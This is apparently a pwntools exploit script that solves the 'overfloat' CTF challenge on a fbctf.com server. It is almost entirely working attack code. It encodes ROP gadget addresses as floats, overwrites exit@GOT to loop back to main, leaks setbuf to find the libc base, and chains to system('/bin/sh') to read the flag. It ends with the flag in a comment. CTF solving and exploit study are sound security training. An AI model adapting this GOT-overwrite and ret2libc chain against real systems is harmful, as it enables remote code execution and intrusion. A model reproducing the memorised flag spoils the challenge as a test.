#!/usr/bin/env python2
from pwn import *
from struct import pack,unpack
SYSTEM_OFFSET = 0x4F440
BIN_SH_OFFSET = 0x1B3E9A
POP_RDI_ADDR = 0x400a83
EXIT_GOT_PLT = 0x602068
SETBUF_GOT_PLT = 0x602030
SETBUF_OFFSET = 0x884D0
PUTS_TIMEOUT_ADDR = 0x400846
DOUBLE_POP_ADDR = 0x400a80
MAIN_ADDR = 0x400993
VULN_FUNC_ADDR = 0x400855
r = remote("challenges.fbctf.com", 1341)
print(r.recvuntil("WHERE WOULD YOU LIKE TO GO?"))
r.send("0\n"*14)
r.send("%.16g\n%.16g\n"%unpack("<ff",pack("<Q",POP_RDI_ADDR)))
r.send("%.16g\n%.16g\n"%unpack("<ff",pack("<Q",EXIT_GOT_PLT)))
r.send("%.16g\n%.16g\n"%unpack("<ff",pack("<Q",DOUBLE_POP_ADDR))) # just to avoid segfault
r.send("0\n"*4)
r.send("%.16g\n%.16g\n"%unpack("<ff",pack("<Q",VULN_FUNC_ADDR))) # we jump to chart_course function with rdi set to exit@got.plt which allows us to write arbitrary data there 
r.send("done\n")
print(r.recvuntil("BON VOYAGE!"))
r.send("%.16g\n%.16g\n"%unpack("<ff",pack("<Q",MAIN_ADDR))) # we write main function pointer to exit@got.plt
print(r.recvuntil("Too Slow! Sorry :(")) # wait until timeout is called (30 seconds)
print(r.recvuntil("WHERE WOULD YOU LIKE TO GO?"))
r.send("0\n"*14)
r.send("%.16g\n%.16g\n"%unpack("<ff",pack("<Q",POP_RDI_ADDR)))
r.send("%.16g\n%.16g\n"%unpack("<ff",pack("<Q",SETBUF_GOT_PLT)))
r.send("%.16g\n%.16g\n"%unpack("<ff",pack("<Q",PUTS_TIMEOUT_ADDR))) # leaked setbuf address from got.plt, so we can calculate libc base
r.send("done\n")
print(r.recvuntil("BON VOYAGE!"))
data=r.recvuntil("_ .--.")
print(data)
setbuf_addr = unpack("<Q",data.splitlines()[1]+"\x00\x00")[0]
libc_base = setbuf_addr-SETBUF_OFFSET
print("[*] setbuf addr: {}\n[*] libc addr: {}".format(hex(setbuf_addr),hex(libc_base)))
r.send("0\n"*14)
r.send("%.16g\n%.16g\n"%unpack("<ff",pack("<Q",POP_RDI_ADDR)))
bin_sh_addr = libc_base+BIN_SH_OFFSET
r.send("%.16g\n%.16g\n"%unpack("<ff",pack("<Q",bin_sh_addr)))
r.send("%.16g\n%.16g\n"%unpack("<ff",pack("<Q",DOUBLE_POP_ADDR))) # to avoid segfault
r.send("0\n"*4)
system_addr = libc_base+SYSTEM_OFFSET
r.send("%.16g\n%.16g\n"%unpack("<ff",pack("<Q",system_addr)))
r.send("0\n"*8)
r.send("done\n") # system("/bin/sh") is executed
r.send("cat /home/overfloat/flag\n")
r.send("exit\n")
print(r.recvall())
# fb{FloatsArePrettyEasy...}